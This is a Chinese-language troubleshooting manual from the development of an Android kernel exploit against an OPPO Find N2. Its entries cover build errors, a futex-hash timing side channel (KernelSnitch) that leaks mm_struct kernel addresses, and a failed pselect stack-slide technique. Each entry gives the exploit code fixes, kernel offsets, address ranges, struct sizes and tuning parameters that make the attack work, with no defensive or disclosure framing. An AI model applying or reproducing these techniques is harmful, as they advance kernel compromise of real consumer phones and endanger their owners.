# 问题排查手册

## 文档说明

本文档收录了开发过程中遇到的所有问题及其解决方案。按类型分类，每条问题包含触发场景、报错信息、排查思路和解决方案。

---

## 编译/构建报错类

### 1. `offset.h` 编译错误: 未定义的偏移量

**触发场景**: 编译 exploit 时缺少 `TARGET_CONFIG_H` 宏定义

**完整报错信息**:
```
error: use of undeclared identifier 'ASHMEM_MISC_FOPS_OFF'
```

**复现步骤**:
```bash
cd exploit/
make  # 不指定 TARGET_CONFIG_H
```

**解决方案**:

Makefile 中自动定义 `TARGET_CONFIG_H`:
```makefile
CFLAGS = ... -DTARGET_CONFIG_H='"$(TARGET_DIR)/target.h"'
```

**根因分析**: `offset.h` 依赖 `target.h` 中定义的偏移量，缺少宏定义会导致所有偏移量未定义。

---

### 2. `__measure` 隐式声明错误

**触发场景**: 在 `kernelsnitch.h` 中调用 `__measure()` 但函数定义在调用之后

**完整报错信息**:
```
error: implicit declaration of function '__measure'
note: previous implicit declaration is here
```

**解决方案**:

在文件开头添加前向声明:
```c
static size_t __measure(size_t futex_addr);
```

**根因分析**: C 语言要求函数在调用前声明或定义。`__measure()` 定义在 `__increase()` 之后，需要前向声明。

---

### 3. shadow stack OOM

**触发场景**: 使用 android35 以外的 NDK 版本编译

**完整报错信息**:
```
ld.lld: error: shadow stack too large
```

**解决方案**:

使用 NDK r29 的 `aarch64-linux-android35-clang`:
```bash
make NDK=/tmp/ndk_extract/android-ndk-r29
```

**根因分析**: 不同 NDK 版本的编译器配置不同，android35 可能启用 shadow stack 导致 OOM。

---

## 运行时异常类

### 4. KernelSnitch mm_struct leak failed

**触发场景**: bruteforce 扫描错误的 IDENTITY 范围

**完整报错信息**:
```
[*] start finding mm_struct [ffffffc000000000-ffffffc080000000]
...
[-] KernelSnitch mm_struct leak failed
```

**排查思路**:
1. 检查 `target.h` 中的 `KERNELSNITCH_IDENTITY_START/END`
2. 确认 mm_struct 实际地址范围 (设备测试: `0xffffff89...`)
3. 验证 IDENTITY 范围是否覆盖 mm_struct

**解决方案**:

修改 `target.h`:
```c
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL  // direct-map start
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL    // direct-map end (16GB)
```

**根因分析**: mm_struct 由 slab 分配器在 direct-map 范围 (`0xffffff80-0xffffffc0`) 中分配，而非 kernel image 范围 (`0xffffffc0-0xffffffc4`)。

---

### 5. pile-up timing ratio ~1.0x

**触发场景**: pile-up 不完整，线程未全部 block

**完整报错信息**:
```
[*] pile-up verified: approx_time=260 baseline=260 ratio=1.0
```

**解决方案**:

修改 `__increase()`:
```c
for (size_t i = 0; i < 16; ++i) sched_yield();
size_t approx_time = __measure((size_t)&ks->inc_futex[id]);
```

**根因分析**: 原始代码只 yield 2 次，线程可能还没全部 block 就开始测量。

---

### 6. hashsize 不匹配

**触发场景**: 用 `sysconf(_SC_NPROCESSORS_ONLN)` 而非 `nr_cpu_ids`

**完整报错信息**:
```
[*] futex_init: nr_cpu_ids=16 futex_hashsize=4096  // 错误: 应该是 2048
```

**解决方案**:

修改 `futex_init()`:
```c
unsigned long cpus = sysconf(_SC_NPROCESSORS_ONLN);
unsigned long raw = cpus * 256;
unsigned long result = 1;
while (result < raw) result <<= 1;
futex_hashsize = result;
```

**根因分析**: `_SC_NPROCESSORS_ONLN` 返回 online CPUs (16)，而内核用 `nr_cpu_ids` (8)。需要 `roundup_pow2` 匹配内核行为。

---

### 7. slide pselect crash (waiter offset mismatch)

**触发场景**: NFDS=320 时，waiter 在 fd_set 数据下方 120 字节

**完整报错信息**:
```
[*] slide pselect before fd install nfds=320
[*] slide pselect after fd install
[*] slide pselect before syscall
[*] slide consumer before tgkill tid=... calls=0
// 然后设备重启
```

**排查思路**:
1. IDA 反编译 `core_sys_select` 确认 fd_set 数据位置
2. 计算 waiter 与 fd_set 数据的偏移差
3. 分析 fd_set bitmaps 能否覆盖 waiter 位置

**解决方案**:

> [!WARNING]
> 当前无解决方案。slide 机制在 OPPO Find N2 上不可行，因为 waiter 在 fd_set 数据下方，fd_set bitmaps 无法到达 waiter 位置。

**根因分析**:
- fd_set 数据: stack_top - 0x210 (core_sys_select SP+0x50)
- waiter: stack_top - 0x288 (do_select 帧内)
- 偏移差: 0x78 (120 bytes)
- fd_set bitmaps 从 stack_top - 0x210 向上增长，无法覆盖 stack_top - 0x288

---

### 8. 碰撞检测假阳性

**触发场景**: timing 测量不可靠，高 timing 不来自 hash bucket 碰撞

**完整报错信息**:
```
// "同 bucket" addr timing=57 (3.0x)
// "不同 bucket" addr timing=145 (7.6x) — 完全反直觉
```

**解决方案**:

增加 `KSNITCH_COLLISIONS` 到 16，提高 bruteforce 选择性:
```c
#define KSNITCH_COLLISIONS 16
```

**根因分析**: 高 timing 来自非 hash bucket 碰撞原因 (VMA lookup、page fault 等)。增加碰撞数可以过滤假阳性。

---

### 9. MM_STRUCT_SZ 不匹配

**触发场景**: 使用仓库默认值 0x500 而非 pahole 验证值 0x3c0

**完整报错信息**:
```
[*] parameters cpu (16) mm_struct sz (500) mm slab order (3) ...
```

**解决方案**:

修改 `common.h`:
```c
#define MM_STRUCT_SZ 0x3c0
```

**根因分析**: 不同内核版本和配置下 mm_struct 大小不同，必须用 pahole 从 vmlinux 中提取。

---

## 功能异常类

### 10. slide pselect 走 kvmalloc 路径

**触发场景**: NFDS ≥ 321 导致 v17 ≥ 43

**完整报错信息**:
```
[*] slide pselect before fd install nfds=640
// 然后设备重启
```

**解决方案**:

保持 NFDS ≤ 320 (栈路径)，但 waiter 偏移问题仍然存在。

**根因分析**: `FRONTEND_STACK_ALLOC=256` 确认阈值为 42.67 bytes。NFDS=320 是栈路径最大值。

---

## 性能问题类

### 11. bruteforce 耗时过长

**触发场景**: IDENTITY 范围过大 (16GB) 或碰撞数不足

**排查思路**:
1. 检查 IDENTITY 范围是否正确
2. 验证碰撞数是否足够
3. 分析 bruteforce 线程数

**解决方案**:

- 确保 IDENTITY 范围正确 (`0xffffff80-0xffffffc0`)
- 增加 `KSNITCH_COLLISIONS` 到 16
- 使用 8 个线程并行 bruteforce
